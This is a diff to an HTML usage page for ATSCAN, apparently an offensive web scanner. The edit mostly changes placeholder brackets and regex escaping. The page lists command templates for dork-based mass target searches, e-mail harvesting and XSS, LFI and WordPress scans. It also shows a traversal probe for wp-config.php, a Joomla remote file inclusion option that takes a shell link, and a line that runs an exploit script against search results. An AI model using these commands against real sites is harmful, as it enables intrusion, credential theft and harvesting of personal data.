@@ -399,88 +399,88 @@
       </td></tr></table>
       <table border="0" cellpadding="2" cellspacing="5" width="100%"><tr><td>    
       <b>SEARCH ENGINE: </b> <br/>
-       Search: atscan --dork <dork> --level <level>  <br/>
-       Search: atscan -d <dork> -l <level>  <br/>
-       Set engine: atscan --dork <dork> --level <level> -m [Bing: 1][Google: 2][Ask: 3][Yandex: 4][Sogou: 5][All: all] <br/>
-       Set selective engines: atscan -d <dork> -l <level> -m 1,2,3.. <br/>
-       Search with many dorks: atscan --dork <dork1,dork2,dork3> --level <level>    <br/>
-       Search and rand: atscan -d <dork> -l <level> --exp "/index.php?id=rang(1-9)" --xss   <br/>
-       Get Server sites: atscan -t <ip> --level <value> --sites <br/>
-       Get Server wordpress sites: atscan -t <ip> --level <value> --wp  <br/>
-       Get Server joomla sites: atscan -t <ip> --level <value> --joom  <br/>
-       Get Server upload sites: atscan -t <ip> --level <value> --upload  <br/>
-       Get Server zip sites files: atscan -t <ip> --level <value> --zip  <br/>
-       WP Arbitry File Download: atscan -t <ip> --level <value> --wpafd  <br/>
-       Joomla RFI: atscan -t <ip> --level <10> --joomfri --shell <shell link> <br/>
-       Search + output: atscan --dork <dorks.txt> --level <level> --save <br/>
-       Search + get emails: atscan -d <dorks.txt> -l <level> --email  <br/>
-       Search + get site emails: atscan --dork <site:site.com> --level <level> --email  <br/>
-       Search + get ips: atscan --dork <dork> --level <level> --ip 
+       Search: atscan --dork [dork> --level [level]  <br/>
+       Search: atscan -d [dork> -l [level]  <br/>
+       Set engine: atscan --dork [dork> --level [level] -m [Bing: 1][Google: 2][Ask: 3][Yandex: 4][Sogou: 5][All: all] <br/>
+       Set selective engines: atscan -d [dork> -l [level] -m 1,2,3.. <br/>
+       Search with many dorks: atscan --dork [dork1,dork2,dork3> --level [level]    <br/>
+       Search and rand: atscan -d [dork> -l [level] --exp "/index.php?id=rang(1-9)" --xss   <br/>
+       Get Server sites: atscan -t [ip] --level <value> --sites <br/>
+       Get Server wordpress sites: atscan -t [ip] --level <value> --wp  <br/>
+       Get Server joomla sites: atscan -t [ip] --level <value> --joom  <br/>
+       Get Server upload sites: atscan -t [ip] --level <value> --upload  <br/>
+       Get Server zip sites files: atscan -t [ip] --level <value> --zip  <br/>
+       WP Arbitry File Download: atscan -t [ip] --level <value> --wpafd  <br/>
+       Joomla RFI: atscan -t [ip] --level [10] --joomfri --shell <shell link> <br/>
+       Search + output: atscan --dork [dorks.txt] --level [level] --save <br/>
+       Search + get emails: atscan -d [dorks.txt] -l [level] --email  <br/>
+       Search + get site emails: atscan --dork <site:site.com> --level [level] --email  <br/>
+       Search + get ips: atscan --dork [dork> --level [level] --ip 
       </td></tr></table>
       <table border="0" cellpadding="2" cellspacing="5" width="100%"><tr><td>    
        <b>REGULAR EXPRESSIONS: </b> <br/>
-       Regex use: atscan [--dork <dork> / -t <target>] --level <level> --regex <regex> <br/>
-       IP: ((?:(?:25[0-5]/2[0-4][0-9]/[01]?[0-9][0-9]?).){ 3}(?:25[0-5]/2[0-4][0-9]/[01]?[0-9][0-9]?)) <br/>
-       E-mails: ((([A-Za-z0-9]+_+)/([A-Za-z0-9]+-+)/([A-Za-z0-9]+.+)/([A-Za-z0-9]+++))*[A-Za-z0-9]+@((w+-+)/(w+.))*w{1,63}.[a-zA-Z]{2,6})
+       Regex use: atscan [--dork [dork> / -t [target]] --level [level] --regex [regex] <br/>
+       IP: ((?:(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)\.){ 3}(?:25[0-5]|2[0-4][0-9]|[01]?[0-9][0-9]?)) <br/>
+       E-mails: '((([A-Za-z0-9]+_+)|([A-Za-z0-9]+\-+)|([A-Za-z0-9]+\.+)|([A-Za-z0-9]+\++))*[A-Za-z0-9]+@((\w+\-+)|(\w+\.))*\w{1,63}\.[a-zA-Z]{2,6})'
       </td></tr></table>
       <table border="0" cellpadding="2" cellspacing="5" width="100%"><tr><td>    
        <b>REPEATER:</b> <br/>
        atscan -t site.com?index.php?id=rang(1-10) --xss <br/>
-       atscan -t <target> --exp "/index.php?id=rang(1-10)" --xss <br/>
-       atscan -t <target> --exp "/index.php?id=repeat(../-9)wp-config.php"
+       atscan -t [target] --exp "/index.php?id=rang(1-10)" --xss <br/>
+       atscan -t [target] --exp "/index.php?id=repeat(../-9)wp-config.php"
       </td></tr></table>
       <table border="0" cellpadding="2" cellspacing="5" width="100%"><tr><td>    
        <b>PORTS</b> <br/>
-       atscan -t <ip> --port <port> [--udp / --tcp] <br/>
+       atscan -t [ip] --port <port> [--udp / --tcp] <br/>
        atscan -t (ip start)-(ip end) --port <port> [--udp / --tcp] <br/>
-       atscan -t <ip> --port (port start)-(port end) [--udp / --tcp] --command "your extern command"
+       atscan -t [ip] --port (port start)-(port end) [--udp / --tcp] --command "your extern command"
       </td></tr></table>
       <table border="0" cellpadding="2" cellspacing="5" width="100%"><tr><td>    
        <b>ENCODE / DECODE:</b> <br/>
-       Generate MD5: --md5 <string> <br/>
-       Encode base64: --encode64 <string> <br/>
-       Decode base64: --decode64 <string>
+       Generate MD5: --md5 [string] <br/>
+       Encode base64: --encode64 [string] <br/>
+       Decode base64: --decode64 [string]
       </td></tr></table>
       <table border="0" cellpadding="2" cellspacing="5" width="100%"><tr><td>    
        <b>POST/GET DATA:</b> <br/>
-       Post data: atscan -t <target> --post <field1:value1,<field2:value2>,<field3:value3> <br/>
-                  atscan -t <target> --post "name:userfile,value:file.txt <br/>
-       Use list:  atscan -t <target> --post "/Desktop/list.txt <br/>
-       Post + Validation: --post "name:userfile,value:file.txt" -v <string> / --status <code>
+       Post data: atscan -t [target] --post <field1:value1,<field2:value2>,<field3:value3> <br/>
+                  atscan -t [target] --post "name:userfile,value:file.txt <br/>
+       Use list:  atscan -t [target] --post "/Desktop/list.txt <br/>
+       Post + Validation: --post "name:userfile,value:file.txt" -v [string] / --status <code>
       </td></tr></table>
       <table border="0" cellpadding="2" cellspacing="5" width="100%"><tr><td>    
        <b>EXTERNAL COMMANDES:</b> <br/>
-       atscan --dork <dork / dorks.txt> --level <level> --command "curl -v --TARGET" <br/>
-       atscan --dork <dork / dorks.txt> --level <level> --command "curl -v --HOST"  <br/>
-       atscan --dork <dork / dorks.txt> --level <level> --command "nmap sV -p 21,22,80 --HOSTIP"  <br/>
+       atscan --dork [dork / dorks.txt] --level [level] --command "curl -v --TARGET" <br/>
+       atscan --dork [dork / dorks.txt] --level [level] --command "curl -v --HOST"  <br/>
+       atscan --dork [dork / dorks.txt] --level [level] --command "nmap sV -p 21,22,80 --HOSTIP"  <br/>
        atscan -d "index of /lib/scripts/dl-skin.php" -l 20 -m 2 --command "php WP-dl-skin.php-exploit.php --TARGET" <br/>
       </td></tr></table>     
       <table border="0" cellpadding="2" cellspacing="5" width="100%"><tr>
         <td>
        <b>MULTIPLE SCANS: </b><br/>
-       atscan --dork <dork> --level <10> --xss --lfi --wp ..<br/>
-       atscan --dork <dork> --level <10> --replace <string> --with <string> --exp <exploit> [--xss / --lfi / --wp /...]<br/>
-       atscan -t <ip> --level <10> [--xss / --lfi / --wp /...]<br/>
-       atscan -t <targets> [--xss / --lfi / --wp /...]</td></tr></table>     
+       atscan --dork [dork> --level [10] --xss --lfi --wp ..<br/>
+       atscan --dork [dork> --level [10] --replace [string] --with [string] --exp [payload] [--xss / --lfi / --wp /...]<br/>
+       atscan -t [ip] --level [10] [--xss / --lfi / --wp /...]<br/>
+       atscan -t [target] [--xss / --lfi / --wp /...]</td></tr></table>     
       <table border="0" cellpadding="2" cellspacing="5" width="100%"><tr>
        <td>
        <b>SEARCH VALIDATION: </b><br/>
-       atscan -d <dork / dorks.txt> -l <level> --status <code> / --valid <string> <br/>
-       atscan -d <dork / dorks.txt> -l <level> --ifinurl <string> <br/>
-       atscan -d <dork / dorks.txt> -l <level> --regex <regex> --valid <string> <br/>
-       atscan -d <dork / dorks.txt> -l <level> --unique </td></tr></table>     
+       atscan -d [dork / dorks.txt] -l [level] --status <code> / --valid [string] <br/>
+       atscan -d [dork / dorks.txt] -l [level] --ifinurl [string] <br/>
+       atscan -d [dork / dorks.txt] -l [level] --regex [regex] --valid [string] <br/>
+       atscan -d [dork / dorks.txt] -l [level] --unique </td></tr></table>     
       <table border="0" cellpadding="2" cellspacing="5" width="100%"><tr>
        <td>
        <b>SCAN VALIDATION: </b><br/>
-       atscan -t <target / targets.txt> [--status <code> / --valid <string>] <br/>
-       atscan -d <dork / dorks.txt> -l <level> --exp <payload> --status <code> / --valid <string> <br/>
-       atscan -d <dorks.txt> -l <level> --replace <string> --with <string> --status <code> / --valid <string> <br/>
-       atscan -d <dork / dorks.txt> -l <level> [--admin / --xss ..] --status <code> / --valid <string> <br/>  
-       atscan -d <dorks.txt> -l <level> --replace <string> --with <string> --status <code> / --valid <string> <br/>
-       atscan -d <dorks.txt> -l <level> --replace <string> --with <string> --full --status <code> / --valid <string> <br/>
-       atscan -d <dorks.txt> -l <level> --replace <string> --with <string> --exp <payload> --status <code> / --valid <string> <br/>
-       atscan --post "name:userfile,value:file.txt" -v <string> / --status <code> <br/>
-       atscan -d <dork / dorks.txt> -l <level> [--xss / --shost ..] --status <code> / --valid <string> <br/>
+       atscan -t <target / targets.txt] [--status <code> / --valid [string]] <br/>
+       atscan -d [dork / dorks.txt] -l [level] --exp [payload] --status <code> / --valid [string] <br/>
+       atscan -d [dorks.txt] -l [level] --replace [string] --with [string] --status <code> / --valid [string] <br/>
+       atscan -d [dork / dorks.txt] -l [level] [--admin / --xss ..] --status <code> / --valid [string] <br/>  
+       atscan -d [dorks.txt] -l [level] --replace [string] --with [string] --status <code> / --valid [string] <br/>
+       atscan -d [dorks.txt] -l [level] --replace [string] --with [string] --full --status <code> / --valid [string] <br/>
+       atscan -d [dorks.txt] -l [level] --replace [string] --with [string] --exp [payload] --status <code> / --valid [string] <br/>
+       atscan --post "name:userfile,value:file.txt" -v [string] / --status <code> <br/>
+       atscan -d [dork / dorks.txt] -l [level] [--xss / --shost ..] --status <code> / --valid [string] <br/>
       </td></tr></table>     
       <table border="0" cellpadding="2" cellspacing="5" width="100%"><tr>
         <td>
